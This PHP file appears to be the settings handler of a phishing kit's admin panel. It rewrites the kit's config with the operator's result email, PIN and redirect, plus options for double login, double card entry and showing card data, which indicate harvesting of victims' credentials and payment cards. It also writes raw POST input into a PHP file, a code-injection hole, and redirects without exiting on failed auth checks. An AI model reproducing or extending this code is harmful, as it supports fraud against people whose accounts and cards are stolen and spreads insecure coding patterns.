<?php
// Stripped and recoded by Beems
error_reporting(0);
session_start();
include'../spox_bot.php';
if (!isset($_SESSION['admino'])) {
  header("location: ../admin/");
}
if(!isset($_SESSION['login'])) {
    header("location: login.php");
}
if (isset($_POST['email'])) {
    $data = [
        'email' => $_POST['email'],
        'redirect_password' => $_POST['redirect_password'],
        'send_mail'   => $_POST['send_mail'],
        'result_pin' => $_POST['result_pin'],
        'textresult' => $_POST['textresult'],
        'mailresult' => $_POST['mailresult'],
        'redirect' => $_POST['redirect'],
        'doublelogin' => $_POST['doublelogin'],
        'doublecc' => $_POST['doublecc'],
        'doubleaccess' => $_POST['doubleaccess'],
        'oneaccess' => $_POST['oneaccess'],
        'beems_protection' => $_POST['beemsprotection'],
        'showcc' => $_POST['showcc'],
        'showaccess' => $_POST['showaccess'],
    ];
$fp = fopen("../spox_bot.php", "r");
$new_line = "";
while (!feof($fp)) {
    $line = fgets($fp);
    $line = preg_replace('/\$email\s=\s.+/', '$email = "'.$data['email'].'";', $line);
    $line = preg_replace('/\$redirect_password\s=\s.+/', '$redirect_password = "'.$data['redirect_password'].'";', $line);
    $line = preg_replace('/\$resultpin\s=\s.+/', '$resultpin = "'.$data['result_pin'].'";', $line);
    $line = preg_replace('/\$sendfrom\s=\s.+/', '$sendfrom = "'.$data['send_mail'].'";', $line);
    $line = preg_replace('/\$double_login\s=\s.+/', '$double_login = "'.$data['doublelogin'].'";', $line);
    $line = preg_replace('/\$double_access\s=\s.+/', '$double_access = "'.$data['doubleaccess'].'";', $line);
    $line = preg_replace('/\$double_cc\s=\s.+/', '$double_cc = "'.$data['doublecc'].'";', $line);
    $line = preg_replace('/\$text_result\s=\s.+/', '$text_result = "'.$data['textresult'].'";', $line);
    $line = preg_replace('/\$send_result\s=\s.+/', '$send_result = "'.$data['mailresult'].'";', $line);
    $line = preg_replace('/\$redirect\s=\s.+/', '$redirect = "'.$data['redirect'].'";', $line);
    $line = preg_replace('/\$onetime\s=\s.+/', '$onetime = "'.$data['oneaccess'].'";', $line);
    $line = preg_replace('/\$show_cc\s=\s.+/', '$show_cc = "'.$data['showcc'].'";', $line);
    $line = preg_replace('/\$show_access\s=\s.+/', '$show_access = "'.$data['showaccess'].'";', $line);
    $line = preg_replace('/\$beems_protection\s=\s.+/', '$beems_protection = "'.$data['beems_protection'].'";', $line);
    $new_line .= $line;
    //echo $new_line;
}
fclose($fp);
$fp = fopen("../spox_bot.php", "w+");
fwrite($fp,$new_line);
fclose($fp);
$_SESSION['success'] = "success";
header("location: settings.php");exit();
} else {
    header("location: settings.php");exit();

}

?>